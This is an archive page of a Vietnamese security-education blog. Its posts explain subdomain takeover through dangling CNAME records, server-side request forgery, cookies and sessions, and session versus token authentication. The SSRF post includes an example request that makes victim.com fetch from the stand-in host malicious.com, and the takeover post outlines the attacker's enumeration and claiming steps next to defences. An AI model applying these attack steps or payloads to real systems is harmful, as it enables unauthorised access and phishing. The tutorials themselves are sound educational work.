<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hydrasky</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Hack to learn, Don&#96;t learn to hack">
<meta property="og:type" content="website">
<meta property="og:title" content="Hydrasky">
<meta property="og:url" content="http://blog.hydrasky.ml/page/2/index.html">
<meta property="og:site_name" content="Hydrasky">
<meta property="og:description" content="Hack to learn, Don&#96;t learn to hack">
<meta property="og:locale">
<meta property="article:author" content="Le Binh An">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hydrasky" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hydrasky</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.hydrasky.ml"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-SQLi TIP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/SQLi%20TIP/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/SQLi%20TIP/">SQLi TIP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Bug bounty Tip/Trick</p>
<p><strong>SQL Injection</strong></p>
<img src="/images/BugBountyTip/sqlinmail1.jpeg" class="[class names]" title="[500] [500] " alt="title text">

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/SQLi%20TIP/" data-id="ckhqle8tn000do7jmgd6bc9qy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SCSP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/SCSP/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/SCSP/">SCSP TIP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Source: <strong>Seasoned Cyber Security Professionals</strong></p>
<img src="/images/SCSP/SCSP.png" class="[class names]" title="[500] [500] " alt="title text">

<img src="/images/SCSP/SCSP1.png" class="[class names]" title="[500] [500] " alt="title text">

<img src="/images/SCSP/SCSP2.png" class="[class names]" title="[500] [500] " alt="title text">



      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/SCSP/" data-id="ckhqle8to000fo7jm63r1a98f" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SUBDOMAIN TAKEOVER" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/SUBDOMAIN%20TAKEOVER/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/SUBDOMAIN%20TAKEOVER/">Subdomain Takeover</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Subdomain takeover được công bố vào năm 2014 là một kiểu tấn công vào tên miền phụ (Subdomain) của  một website và nguyên nhân dẫn đến là do việc cấu hình DNS . Bằng cách này hacker có thể chiếm được full quyền kiểm soát của một subdomain từ đó thực hiện các cuộc tấn công giả mạo trang web (phishing) hoặc phát tán mã độc (malwares).</p>
<p>Như các bạn đã biết ** ** Domain ** ** name là tên đại diện của một website hoạt động trên internet, đóng vai trò là một địa chỉ vật lý thay vì dùng địa chỉ ip (lí do tại sao chắc các bạn đều rõ ) . Còn Subdomain <strong>** là phần mở rộng của một tên miền.Subdomain **</strong> có thể được tạo hoàn toàn miễn phí và nó có thể hoạt động như một tên miền thực thụ.Subdomainra đời nhằm giải quyết về chi phí đăng ký tên miền cũng như giúp bạn tạo ra nhiều website trên các lĩnh vực khác nhau thuộc tên miền chính. Ví dụ :</p>
<p>Domain: example.comSubdomain : hello.example.comDomain vs Subdomain</p>
<p>Gỉa sử bạn ở hữu một domain example.com và server của bạn có ip là 1.2.3.4 . Bây giờ bạn muốn trỏ domain về địa chỉ ip của server , nhà cung cấp tên miền (DNS provider) sẽ có cách giúp bạn làm điều này. Nhà cung cấp sẽ cung cấp trình quản lý tên miền để bạn có thể thêm, sửa ,trỏ tên miền về địa chỉ bạn muốn.</p>
<img src="/images/Sub/image-2.png" class="[class names]" title="[500] [500] " alt="Quản lí domain">


<p>Trong phần cấu hình sẽ có mục bản ghi cho tên miền “record” dùng để dùng để mô tả các thông tin về cơ sở dữ liệu DNS, bạn có thể tham khảo <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types" target="_blank" rel="noreferrer noopener" aria-label="DNS_Record (opens in a new tab)">DNS_Record</a> . Đối với vấn đề này ta chỉ biết đến các bản ghi sau:</p>
<ul><li>Bản ghi A hoặc AAAA</li><li>Bản ghi CNAME</li><li>Bản ghi bổ sung như ALIAS và URL </li></ul>


<p>Bản ghi A vs AAAA: Đây là các bản ghi thường được dùng, dùng để trỏ một domain hoặc subdomain về một host hay ip tương ứng.</p>
<p>Bản ghi CNAME : hay còn gọi là Bản ghi bí danh dành cho các tên miền phụ . Bản ghi CNAME cho phép một server có thể có nhiều tên. Nói cách khác bản ghi CNAME cho phép nhiều tên miền cùng trỏ đến một địa chỉ IP cho trước hoặc liên kết tới một bản ghi khác .Ví dụ : “hello.example.com hi.demo.com CNAME”</p>
<p>Bản ghi bổ sung như ALIAS và URL : Đây là những bản ghi không có trong<a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc1035.txt">DNS RFC</a>, vì vậy chúng chỉ được hỗ trợ bởi một số nhà cung cấp DNS nhất định.ALIASlà một bản ghi giả hoạt động như mộtCNAMEnhưng có thể được sử dụng cho cả tên miền gốc và tên miền phụ.Bảnghi chuyển hướng URLđược sử dụng để chuyển hướng một tên miền sang một tên miền / URL khác.</p>
<h4>SECOND-ORDER SUBDOMAIN TAKEOVERS</h4>



<p>Quay trở lại vấn đề, việc hacker cơ tiếp quản subdomain là do cấu hình DNS. Thông thường các dịch vụ bên thứ 3 như Desk, Squarespace, Shopify, Github, Tumblr, và Heroku … khi người dùng đăng kí lấy ứng dụng, tài khoản thì sẽ được cấp một subdomain đi kèm để truy cập trực tiếp vào nội dung của mình như sau :</p>
<img src="/images/Sub/image-3.png" class="[class names]" title="[500] [500] " alt="Quản lí domain">




<p>Tuy nhiên mọi người thường muốn dùng tên miền của riêng mình thay vì tên miền của Provider cấp cho. Đơn giản họ chỉ cần cấu hình DNS trỏ tên miền của họ về tiên miền được cung cấp bởi bên thứ 3 : “shop.example.com”</p>
<img src="/images/Sub/image-4.png" class="[class names]" title="[500] [500] " alt="Quản lí domain">




<p>Và vấn đề ở đây xảy ra khi các subdomain do bên thứ 3 cung cấp đã hêt hạn đăng kí sẽ có hai trường hợp xảy ra là người dùng không muốn dùng nữa và quên đăng kí thêm thời gian. Cùng với đó người quản trị không bỏ , thay đổi cấu hình trong DNS .Hacker sẽ tìm các ra subdomain  của người dùng  bằng các công cụ như Subfinder, SubStack , Amass,crt.sh … </p>
<figure class="wp-block-image"><img src="https://mamot.fr/system/media_attachments/files/007/727/655/original/8c42a00a677333d1.png?1577792038" alt="Kết quả hình ảnh cho subfinder"/></figure>



<p>Sau đó hacker sẽ tìm những subdomain nào không còn sử dụng nữa và khả năng tiếp quản nó. Sử dụng các dấu hiệu như sau để nhận biết :</p>
<figure class="wp-block-image"><img src="https://securitytrails.com/images/f/1/4/d/c/f14dc8034d6cf93efdf31c19c51b18bc97f19fa6-table.png" alt="tên miền phụ dễ bị chiếm đoạt tên miền phụ trong năm 2019"/></figure>



<p>Thường hacker sẽ sử dụng các command linux như: host, dig để tìm kiếm tên của bên thứ 3 (provider)</p>
<figure class="wp-block-image"><img src="https://www.researchgate.net/profile/S_M_Zia_Ur_Rashid/publication/332353497/figure/fig2/AS:746585789042693@1555011331203/Checking-DNS-Record-using-dig-command.png" alt="Kết quả hình ảnh cho dig command"/></figure>



<p>Tìm các subdomain có sử dụng bản ghi CNAME sẽ có khả năng tiếp quản rất cao bởi vì bản ghi CNAME là để dùng để liên kết 1 domain khác. Hacker sẽ đăng kí với bên thứ 3 đó để có tên miền như tên miền người dùng đăng kí và sau đó chỉ cần cấu hình subdomain được cung cấp nhận subdomain, ip tương ứng với cấu hình DNS của người dùng . SUBDOMAIN TAKEOVER!!!!</p>
<figure class="wp-block-image"><img src="https://0xpatrik.com/content/images/2018/06/takeover_basic.png" alt=""/></figure>



<p>Chi tiết thực hiện các bạn có thể tham khảo trong rất nhiều writeup,bugbounty progam :</p>
<ul><li><a target="_blank" rel="noopener" href="https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd">https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd</a></li><li><a target="_blank" rel="noopener" href="https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1">https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1</a></li><li><a target="_blank" rel="noopener" href="https://hackerone.com/hacktivity">https://hackerone.com/hacktivity</a></li></ul>


<p> <strong>Làm thế nào để tránh những vấn đề như vậy?: -</strong> Luôn cập nhật hồ sơ DNS của bạn, xóa CNAME hoặc bất kỳ bản ghi DNS nào khác không được sử dụng.</p>
<p>Link tham khảo :</p>
<ul><li><a target="_blank" rel="noopener" href="https://securitytrails.com/blog/subdomain-takeover-tips">https://securitytrails.com/blog/subdomain-takeover-tips</a></li><li><a target="_blank" rel="noopener" href="https://blog.cystack.net/subdomain-takeover/">https://blog.cystack.net/subdomain-takeover/</a></li><li><a target="_blank" rel="noopener" href="https://github.com/EdOverflow/can-i-take-over-xyz">https://github.com/EdOverflow/can-i-take-over-xyz</a></li></ul>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/SUBDOMAIN%20TAKEOVER/" data-id="ckhqle8tr000ho7jm04p60g0z" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Server Side Request Forgery (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/">Server Side Request Forgery (PART 1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/server-side%20request%20forgery.svg" alt="SSRF"/><figcaption>Ảnh minh họa (PortSwigger)</figcaption></figure>



<p>Server site request Forgery gọi tắt là SSRF, ngược với lại <a target="_blank" rel="noopener" href="http://hydrasky.ml/2020/03/cross-site-request-forgery">CSRF</a> đây là kiểu tấn công giả mạo yêu cầu phía máy chủ, máy chủ sẽ thực hiện các HTTP request đến các tên miền mà attacker muốn . Nguy hiểm hơn tấn công SSRF sẽ giúp hacker bypass và tấn công trực tiếp vào các hệ thống nội bộ (Internal) phía sau tường lửa (Firewall) hoặc các kết nối với bên thứ 3, thực hiện các hành động và truy cập trái phép vào dữ liệu của tổ chức.</p>
<p>Nhìn vào hình bên trên, nó sẽ giải thích cách tấn công SSRF, attacker sẽ gửi một URL có chứa payload tới nơi có chứa lỗ hổng trên web app thông qua Request A.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET payload?returnurl&#x3D;http:&#x2F;&#x2F;malicious.com&#x2F;</span><br><span class="line">HTTP&#x2F;1.1 Host: victim.com</span><br></pre></td></tr></table></figure>

<p>Trong yêu cầu trên, chúng ta có thể thấy máy chủ lưu trữ là victim.com và yêu cầu GET đang lấy tham số của “url” , tham số của url không được kiểm soát .Lúc này webapp sẽ lấy giá trị của “url” để tạo ra một request khác (Request B) tới “<a target="_blank" rel="noopener" href="http://malicious.com&quot;/">http://malicious.com&quot;</a> . Máy chủ lúc này sẽ nhận và xử lý việc thực hiện request B .Tiếp tục webapp lúc này sẽ hiển thị một số hoặc toàn bộ kết quả trả về máy chủ , dựa vào đó attacker có thể truy cập dữ liệu trái phép hoặc thực hiện các cuộc tấn công khác như :</p>
<ul><li>Port Scanning</li><li>Denial of Service</li><li>Tấn công vào các ứng dụng khác trong hệ thống bằng các kĩ thuật như Buffer Overflow</li><li><a target="_blank" rel="noopener" href="http://hydrasky.ml/2020/03/cross-site-scripting-part1">Cross Site Script</a></li></ul>



<figure class="wp-block-image"><img src="https://miro.medium.com/max/1368/1*FVIKVlXUN8_WqiVAmwM5GA.png" alt="Kết quả hình ảnh cho ssrf exploit"/><figcaption>Ví dụ SSRF</figcaption></figure>



<p>Trường hợp đặc biệt, webapp không trả về bất kì điều gì dấu hiệu gì thì vẫn có khả năng tồn tại lỗ hổng được gọi là Blind SSRF. Để xác định Blind SSRF bạn cần phải có một server bên ngoài mở một port bất kì và set payload của bạn về địa chỉ với port đang lắng nghe của server.</p>
<p>Hoặc đơn giản nhất bạn có thể dùng Burp Collaborator được tích hợp trong Burpsuite (Công cụ của PortSwigger) - <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Link hướng dẫn</a> .</p>
<figure class="wp-block-image"><img src="https://static.packt-cdn.com/products/9781789531732/graphics/61e54233-2d8a-4ed6-aee1-2e4e10e77780.png" alt="Kết quả hình ảnh cho Burp Collaborator"/><figcaption>Burp Collaborator</figcaption></figure>



<h4>Cách ngăn chặn phòng chống SSRF</h4>



<p>Việc sử dụng blacklist và regular expressions để kiểm soát đầu vào rất khó và không hữu hiệu. Sử dụng backlist có thể ảnh hưởng đến các chức năng và công việc. Còn regular expressions thì cũng rất dễ để hacker tìm cách bypass như  <a target="_blank" rel="noopener" href="http://www.pc-help.org/obscure.htm">Malicious URL’s Using DWORD Formatted IPAddresses </a>.</p>
<p>Phương pháp hiệu quả để tránh SSRF là liệt kê danh sách tên DNS hoặc địa chỉ IP mà ứng dụng của bạn cần truy cập (Whitelist). Thực chất SSRF không có bản sửa lỗi cụ thể vì nó phụ thuộc nhiều vào chức năng ứng dụng và yêu cầu kinh doanh. Việc sử dụng một loại list rất khó để bảo vệ nên kết hợp Backlist với whitelist  nhưng điều quan trọng là phải xác thực hợp lệ đầu vào của người dùng.</p>
<p>Không những phải kiểm xoát đầu vào bạn cần phải kiểm soát dữ liệu trả về cho người dùng.Để ngăn chặn dữ liệu phản hồi rò rỉ cho kẻ tấn công, phải đảm bảo rằng phản hồi nhận được như ý muốn.</p>
<p>Kẻ tấn công thường dùng<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_URI_schemes"> URL schemas</a> để khai thác hệ thống thông qua lỗ hổng SSRF vì vậy nên vô hiệu hóa một số URL schemas như file:///, dict://, ftp:// và gopher://.</p>
<p>Kẻ tấn công có thể sử dụng lỗ hổng Server Side Request Forgery để truy cập một số dịch vụ này mà không cần bất kỳ xác thực nào.Do đó, để đảm bảo bảo mật ứng dụng web, tốt nhất là cho phép xác thực bất cứ nơi nào có thể, ngay cả đối với các dịch vụ trên mạng cục bộ.</p>
<p>Trong phần tiếp theo mình sẽ phân tích rõ các cách thức tấn công qua lỗ hổng này !</p>
<h4>Link tham khảo </h4>



<ul><li><a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/">https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/</a></li><li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></li><li>Mastering Modern Web Penetration Testing Book - Prakhar Prasad</li></ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/" data-id="ckhqle8tu000mo7jm1ircg26g" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Session &amp; Cookie" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Session%20&%20Cookie/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Session%20&%20Cookie/">Session &amp; Cookie</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Mục tiêu của các cuộc tấn công như XSS  là lấy được session và cookie của nạn nhận. Vậy chúng là gì và tại sao là chúng mà không phải là username, password. Ok chúng ta cùng tìm hiểu nha.</p>
<h2>COOKIE</h2>

<p>Đầu tiên chúng ta cùng đến với cookie</p>
<div class="wp-block-media-text alignwide is-stacked-on-mobile"><figure class="wp-block-media-text__media"><img src="https://www.cookingclassy.com/wp-content/uploads/2014/06/chocolate-chip-cookie-16.jpg" alt="One Chocolate Chip Cookie - Cooking Classy"/></figure><div class="wp-block-media-text__content">
<p class="has-large-font-size">Cookie
</div></div>

<p>Cookie là một tệp tin chứa các thông tin nhỏ và hỗn tạp như id, username, timestamp … (mỗi giá trị này sẽ có một  <strong>key-value</strong>  ví dụ như <span style="text-decoration: underline;"><em> <strong>uuid</strong> </em></span>=12345 ) của người dùng vì vậy nó được ví như bánh cookie .Nó được tạo ra khi người dùng truy cập đến các trang web, server sẽ gửi nó đến browser và lưu trên máy tính của chúng ta. Nó sẽ được lưu tạm thời trong một khoảng thời gian (timeout) có thể là vài tuần hoặc tháng  .Khi người dùng truy cập đến trang web lần sau , browser sẽ gửi lại các thông tin này đến server .</p>
<p>Dựa vào tính chất có thể phân ra làm 2 loại cookie là Persistent cookie  và Session cookie, nó cũng chính là cookie và session. </p>
<h4>Mục đích của cookie để làm gì ?</h4>

<p>Cookie được xem là thành phần không thể thiếu đối với những website có lượng lớn dữ liệu, số lượng người dùng đông. Tác dụng đầu tiên có thể kể đến ở đây là cookie có thể dùng để duy trì trạng thái đăng nhập. Thay vì cứ mỗi lần truy cập vào trang web bạn phải đăng nhập lại thì cookie sẽ làm giúp bạn điều này .  Ngoài ra với cookie, các website còn có thể xác định các hành vi của người dùng như số khách hàng truy cập đến , tần xuất truy cập của một khách hàng vào trang, khách hàng mới hay khách hàng cũ, khách hàng đã xem cái gì. Vì vậy nó rất có ích và tiện lợi cho các web site thương mại điện tử.</p>
<p>Chắc bạn cũng thắc mắc tại sao khi mình truy cập vào các trang web A  xem cách sản phẩm sau đó truy cập vào các trang web B thì thấy nó quảng cáo sẩn phẩm A như kiểu mình bị theo dõi vậy haha. Nó là do website B sử dụng cookie của website A tạo ra  nó gọi là cookie bên thứ 3 (third party). Nó đôi khi khó chịu nhưng thôi cũng kệ !!!</p>
<p>Ở một số web, người ta sử dụng các tham số trong Cookies để tạo ra Session nhưng điều này thì không được khuyến nghị.</p>
<h4>Cookie có cần bảo mật không ?</h4>

<p>Tất nhiên là có, nó rất quan trọng ấy chứ!</p>
<p>Cookie lưu trữ các dữ liệu nhạy cảm vi nó chứa các thông tin của người dùng và đặc biệt là sessionid . Vì vậy để tránh bị tiết  lộ rộng rãi , chỉ cho phép website chứa cookie  mới có thể xem được thông tin này. Một số trình duyệt hiện tại có chức năng ngân chặn bên thứ 3 hoặc yêu cầu người dùng phải cấp quyền đọc cookie.<br>Ngoài ra có một số cách bảo vệ cookie hữu hiệu khỏi việc bị đọc trên trình duyêt (tấn công xss) hay trên kết nỗi tới server đó là sử dụng HTTPonly và Security flag. </p>
<h2>SESSION</h2>

<div class="wp-block-image"><figure class="aligncenter"><img src="https://media.hoclaptrinh.vn/images/session-la-gi-5c370b6a76d46.gif" alt="Session Là Gì?"/></figure></div>

<p>Session hay dân ta gọi là phiên làm việc hoặc trạng thái làm việc, một session bắt đầu khi client gửi request đến server, nó tồn tại xuyên suốt từ trang này đến trang khác trong ứng dụng web và chỉ kết thúc khi hết thời gian timeout hoặc khi bạn đóng ứng dụng. Với mỗi session sẽ được cấp phát một định danh duy nhất SessionID .Sẽ không có chuyện trùng lặp nha các bạn kể cả cùng một tài khoản đăng nhập trên hai trình duyệt . Và một điều nữa, khác với cookie , Session sẽ được lưu lại ở phía server.</p>
<p>Có bạn sẽ thắc mắc là “ Ơ thế sao tôi lại thấy session ở trong cookie gửi từ client lên?” hoặc “làm sao để server xác định session đó là của client nào?”</p>
<p> Session được tạo ra và lưu trên server (mk cx chưa biết mặt mũi nó thế nào nhưng cũng không cần quan tâm ),đồng thời nó tạo ra một tệp tin chứa id session gọi là session cookie (sessionid) gửi cho client  lưu trên bộ nhớ cache của trình duyệt. Do đó cái chúng ta thường thấy trong cookie của request đó là Sessionid chứ không phải là session. </p>
<p> Còn làm sao để xác thực thì bạn biết rồi đấy, nó đi cùng cookie mà nhưng cũng chính vì điều này mà hacker có thể chiếm session của bạn.</p>
<h4>Thế mục đích của Session để làm gì ?</h4>

<p>Một session có thể lưu trữ tạm thời thông tin liên quan đến các hoạt động ở của người dùng  trong khi kết nối . Ví dụ như bạn click vào sản phẩm, thêm sản phẩm vào mục xem sau, … . Nó chỉ có tác dụng kiểm tra khi 1 phiên bắt đầu và kết thúc tại thời điểm nào .</p>
<p>Tùy vào mục đích công việc mà bạn nên sử dụng session hợp lý nhất nhằm mang lại hiệu quả tối đa. Dưới đây là những lĩnh vực cần:</p>
<p> <strong>Các ứng dụng thương mại điện tử</strong> : Có thể xem xét các phiên để xem người dùng mất bao lâu để chuyển đổi hoặc thời gian trung bình của người dùng theo từng trang. Mục đích này sẽ giúp họ biết được sản phẩm nào được người dùng chú ý.</p>
<p> <strong>Các nhà phát triển trò chơi, game online</strong> : Có thể phân tích thời lượng phiên của họ để xem liệu người dùng có đầu tư đủ thời gian vào trò chơi để tận hưởng trải nghiệm được cung cấp hay không.</p>
<p> <strong>Các ứng dụng truyền thông xã hội</strong> : Có thể kiểm tra số phiên trong suốt một ngày để xem liệu người dùng có biến công cụ này thành một phần thiết yếu trong cuộc sống hàng ngày của họ hay không.</p>
<p>Nhưng giống với cookie, session cũng có thể dùng để duy trì trạng thái đăng nhập nhưng chỉ trong thời gian ngắn. Và đây là nguyên nhân hacker  muốn chiến session bạn.</p>
<h4>Bảo mật cho session ?</h4>



<p>Ngoài việc server tạo các session có thể dễ đoán ra thì bình thường nó vẫn rất an toàn, an toàn hơn nhiều so với cookie. Bởi nó  không thể thay đổi giá trị  khi được lưu trữ trên server. Hacker chỉ có thể tìm cách là ăn trộm nó qua các lỗ hổng như XSS, Session hijacking và đọc được request của bạn.</p>
<p>Một khuyến nghị cho các bạn đọc là không nên thực hiện các giao dịch hay truy cập tài khoản ở các điểm truy cập internet công cộng, bạn sẽ rất dễ bị hack.</p>
<p>###So Sánh Cookie vs Session</p>
<p>Bây giờ chúng ta cùng Cùng so sánh các điểm khác biệt giữa chúng nha.</p>
<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>                           **Cookie** </td><td>                          **Session** </td></tr><tr><td>Cookie được lưu trữ trên trình duyệt của người dùng.</td><td>Session không được lưu trữ trên trình duyệt.</td></tr><tr><td>Dữ liệu cookie được lưu trữ ở phía client.</td><td>Dữ liệu session được lưu trữ ở phía server.</td></tr><tr><td>Dữ liệu cookie dễ dàng sửa đổi hoặc đánh cắp khi chúng được lưu trữ ở phía client.</td><td>Dữ liệu session không dễ dàng sửa đổi vì chúng được lưu trữ ở phía máy chủ.</td></tr><tr><td>Dữ liệu cookie có sẵn trong trình duyệt đến khi expired.</td><td>Sau khi đóng trình duyệt sẽ hết phiên làm việc (session)</td></tr></tbody></table></figure>
<!-- /wp:table -->


<p>Ok như vậy là mình dã trình bày một số kiển thức về session và token. Các bạn có ý kiến gì hãy để lại comment cho minh nhé!</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/Session%20&%20Cookie/" data-id="ckhqle8tv000oo7jm3sf160o2" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Session vs Token-Based Authentication" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/">Session &amp; Token-Based Authentication</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Xin chào các bạn, bài viết này mĩnh sẽ nói về 2 cơ chế xác thực người dùng dựa vào session và token. Chắc nhiều bạn thấy chúng rât nhiều nhưng cũng chưa rõ nó hoạt động như thế nào .Ok chúng ta cùng tìm hiểu nào.</p>
<h4>Tại sao lại dùng session hay token để xác thực người dùng ?</h4>

<p>Như các bạn đã biết việc giao tiếp giữa trình duyệt web (user) với  với máy chủ sẽ sử dụng giao thức truyền siêu văn bản  HTTP (Hypertext Transfer Protocol) . Mà HTTP là một giao thức phi trạng thái (Stateless) - phiên kết nối (TCP session) sẽ mất khi gói tin đến đích . Điều đó đồng nghĩa với việc mỗi lần user request đến tài nguyên cần xác thực họ sẽ phải đăng nhập một lần. Oh Bully sh!t ! Vì vậy người ta cần tìm cách để có thể xác thực và duy trì trạng thái đăng nhập cho người dùng và đó là lí do  dùng đến session và token. Thực ra ngoài hai phương thức này còn một phương thức cổ điển nữa mà thỉnh thoảng ta vẫn hay gặp đó là HTTP basic authentication nhưng nó rất đơn giản, thô và thường chỉ sử dụng trong nội bộ nên mình sẽ bỏ qua. Ok tiếp tục nào !</p>
<h2>Session based Authentication</h2>

<p>Trong bài viết trước của mình có giải thích về session , bạn nào chưa biết có thể tham khảo. Session sẽ được tạo ra khi user request đến server và server sẽ gửi sessionid về browser và lưu trữ ở cache browser. Các request tiếp theo từ browser lên server thì sessionid được đính kèm dưới dạng cookie . Server sẽ thực hiện so sánh giá trị sessionid và trả response về.</p>
<figure class="wp-block-image"><img src="https://images.viblo.asia/full/fdd3546f-1ee6-4ea7-afa4-d07189532c30.png" alt=""/></figure>

<h3> **Ưu điểm:** </h3>

<p> <strong>Thông tin được giấu kín, an toàn:</strong> Client chỉ được biết tới <strong>Session ID</strong> thường là 1 chuỗi random hoặc đã được băm không có thông tin gì của người dùng, còn mọi thông tin khác của phiên đăng nhập hay người dùng hiện tại đều được lưu phía server nên cơ chế này giữ kín được thông tin của người dùng trong quá trình truyền tải.</p>
<p> <strong>Fully-controlled session:</strong> Tính chất này có thể cho phép hệ thống quản trị được <strong>TẤT CẢ</strong> các hoạt động liên quan tới phiên đăng nhập của người dùng như thời gian login, force logout,…</p>
<h3>Nhược điểm</h3>

<p> <strong>Chiếm nhiều bộ nhớ:</strong> Với mỗi phiên làm việc của user, server sẽ lại phải tạo ra một session và lưu vào bộ nhớ trên server. Số data này có thể còn lớn hơn cả user database của bạn do mỗi user có thể có vài session khác nhau. Do vậy việc tra cứu đối với các hệ thống lớn nhiều người dùng sẽ là vấn đề.</p>
